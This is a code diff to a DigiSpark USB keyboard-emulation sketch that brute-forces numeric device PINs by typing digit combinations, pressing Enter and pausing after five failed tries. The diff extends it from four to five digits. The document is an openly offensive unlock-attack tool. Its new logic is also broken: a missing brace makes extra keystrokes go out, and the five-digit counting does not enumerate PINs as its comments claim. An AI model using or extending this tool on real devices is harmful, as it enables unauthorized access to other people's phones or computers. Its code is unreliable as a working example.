@@ -11,7 +11,9 @@ int a = 0; //1st digit
 int b = 0; //2nd digit
 int c = 0; //3rd digit
 int d = 0; //4th digit
+int e = 0; //5th digit
 int count = 0;
+bool key_stroke_e = false;
 
 void setup() {
   DigiKeyboard.update();
@@ -20,7 +22,7 @@ void setup() {
 }
 
 void loop() {
-  //After 5 tries it waits 30 seconds and turns on the On-Board LED to indicate it is waiting.
+  //After 5 attempts, initialize 31000 ms wait to retry.
   if(count == 5){
     digitalWrite(1,HIGH); //Change this to 0 if using DigiSpark model B
     DigiKeyboard.sendKeyStroke(40); //we hit enter to make the popup go away
@@ -28,10 +30,21 @@ void loop() {
     count = 0;
     digitalWrite(1,LOW);
   }
-  DigiKeyboard.sendKeyStroke(num[a]);
-  DigiKeyboard.sendKeyStroke(num[b]);
-  DigiKeyboard.sendKeyStroke(num[c]);
-  DigiKeyboard.sendKeyStroke(num[d]);
+  /*Sends keystrokes based upon the values between 0-9 
+  It will start bruting 5 digits if a exceeds 10*/
+  if (key_stroke_e == false)
+    DigiKeyboard.sendKeyStroke(num[a]);
+    DigiKeyboard.sendKeyStroke(num[b]);
+    DigiKeyboard.sendKeyStroke(num[c]);
+    DigiKeyboard.sendKeyStroke(num[d]);
+  //check for whether it is true. If so, use 5 digits instead.
+  if (key_stroke_e == true){
+    DigiKeyboard.sendKeyStroke(num[a]);
+    DigiKeyboard.sendKeyStroke(num[b]);
+    DigiKeyboard.sendKeyStroke(num[c]);
+    DigiKeyboard.sendKeyStroke(num[d]);
+    DigiKeyboard.sendKeyStroke(num[e]);
+  }
   DigiKeyboard.sendKeyStroke(40);
   delay(1000);
   d++;
@@ -48,8 +61,17 @@ void loop() {
       if(b == 10){
         b = 0;
         a++; //if the 1st digit is past 9 it'll probably just throw out errors.
-        //TODO: add a section to try 5+ digit PINS
-      }
+	if(a == 10){
+	  //remain_true will equal true, loop through void(), and send the 5th keystroke
+	  key_stroke_e = true;
+	  e++;
+	  //Remember that brute forcing will still work, despite its strange order.
+	  //After e == 10, it will become 0 again.
+	  if(e == 10){
+	    e = 0;
+	  }
+	}
+      }  
     }
   }    
 }
